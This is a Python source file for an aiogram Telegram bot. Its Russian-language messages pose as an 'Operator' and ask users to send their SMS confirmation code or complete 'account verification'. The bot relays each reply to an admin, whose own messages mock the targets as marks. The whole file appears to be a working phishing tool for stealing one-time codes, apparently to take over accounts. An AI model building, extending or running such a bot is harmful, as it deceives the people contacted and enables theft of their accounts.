from aiogram import Router, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from config import ADMIN_ID
from aiogram.filters.command import CommandObject

router = Router()

pending_codes = {}
pending_verifes = {}


# 👇 Клавиатура с кнопками для админа
admin_code_keyboard = InlineKeyboardMarkup(
    inline_keyboard=[
        [
            InlineKeyboardButton(text="✅", callback_data="code_ok"),
            InlineKeyboardButton(text="❌", callback_data="code_wrong")
        ]
    ]
)

admin_verif_keyboard = InlineKeyboardMarkup(
    inline_keyboard=[
        [
            InlineKeyboardButton(text="✅", callback_data="verif_ok"),
            InlineKeyboardButton(text="❌", callback_data="verif_wrong")
        ]
    ]
)


def get_user_verif_keyboard(user_id: int):
    return InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(text='✅ Верификация пройдена', callback_data=f'verif:{user_id}')
                ]
            ]
    )


@router.message(Command("get_verif"))
async def get_verif(message: types.Message, command: CommandObject):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(command.args)
            pending_verifes[user_id] = ADMIN_ID

            await message.answer(f'<b>Новый запрос на вериф\nтук... тук... {user_id}</b>',
                                 parse_mode='HTML')

            await message.bot.send_message(user_id,
                                           'Оператор запросил у Вас верификацию на аккаунте.',
                                           reply_markup=get_user_verif_keyboard(user_id))
        except Exception as e:
            await message.answer(f'❌ Ошибка: <b>{e}</b>', parse_mode='HTML')


@router.message(Command("get_code"))
async def start_command(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            pending_codes[user_id] = ADMIN_ID
            await message.answer(f"<b>ща схожу спрошу"
                                 f"\nу вотетава {user_id}</b>",
                                 parse_mode="HTML")
            await message.bot.send_message(user_id, 'Оператор запросил у Вас код подтверждения из СМС.'
                                                    '\nПожалуйста, отправьте его в ответ на это сообщение.')
        except (IndexError, ValueError):
            await message.answer("❗ чудак? напиши нормально. Пример:\n<b>/get_code 123456789</b>",
                                 parse_mode='HTML')
        except Exception as e:
            await message.answer(f'Ты чето не так сделал, читай ошибку или кинь умному какому-то\n<b>{e}</b>',
                                 parse_mode='HTML')


@router.message(F.text)
async def receive_code(message: types.Message):
    if message.from_user.id in pending_codes:
        admin_id = pending_codes[message.from_user.id]
        await message.bot.send_message(
            admin_id,
            f"📩 сюююда котлетка, жмякай шо там ({message.from_user.id}):\n\n`{message.text}`",
            parse_mode="Markdown",
            reply_markup=admin_code_keyboard
        )
        await message.answer("✅ Код отправлен оператору.")


@router.callback_query(F.data == "code_ok")
async def code_ok_handler(callback: CallbackQuery):
    await callback.answer("изи")
    await callback.message.edit_reply_markup(reply_markup=None)

    text = callback.message.text
    user_id = int(callback.message.text.split("шо там (")[1].split(")")[0])

    pending_codes.pop(user_id, None)


@router.callback_query(F.data == "code_wrong")
async def code_wrong_handler(callback: CallbackQuery):
    await callback.answer("ща пойду спрошу че там")

    text = callback.message.text
    user_id = int(callback.message.text.split("шо там (")[1].split(")")[0])

    await callback.bot.send_message(
        user_id,
        "❌ Отправленный код оказался неверным. Пожалуйста, попробуйте ещё раз и отправьте новый код."
    )

    await callback.message.edit_reply_markup(reply_markup=None)


@router.callback_query(F.data.startswith("verif:"))
async def user_verif_send(callback: CallbackQuery):
    user_id = int(callback.data.split(':')[1])
    await callback.answer('Верификация отправлена администратору.')
    await callback.bot.send_message(
        ADMIN_ID,
        f"<b>ну чел сказал, шо всё сделал\n{user_id}</b>",
        reply_markup=admin_verif_keyboard,
        parse_mode='HTML'
    )


@router.callback_query(F.data == 'verif_ok')
async def verif_ok(callback: CallbackQuery):
    await callback.answer("🎖 Герой советского союза")
    await callback.message.edit_reply_markup(reply_markup=None)

    user_id = int(callback.message.text.split("\n")[1])

    await callback.bot.send_message(user_id,
                                    '<b>Верификация успешно пройдена ✅</b>',
                                    parse_mode='HTML')
    pending_codes.pop(user_id, None)


@router.callback_query(F.data == 'verif_wrong')
async def verif_wrong(callback: CallbackQuery):
    user_id = int(callback.message.text.split("\n")[1])
    await callback.answer("переспрошу сейчас")
    await callback.message.edit_reply_markup(reply_markup=None)

    await callback.bot.send_message(
        user_id,
        "❌ Верификация не пройдена. Пожалуйста, попробуйте ещё раз или свяжитесь с оператором для помощи."
    )

    pending_verifes.pop(user_id, None)


@router.callback_query()
async def unknown_callback(callback: CallbackQuery):
    await callback.answer("❓ Неизвестное действие", show_alert=True)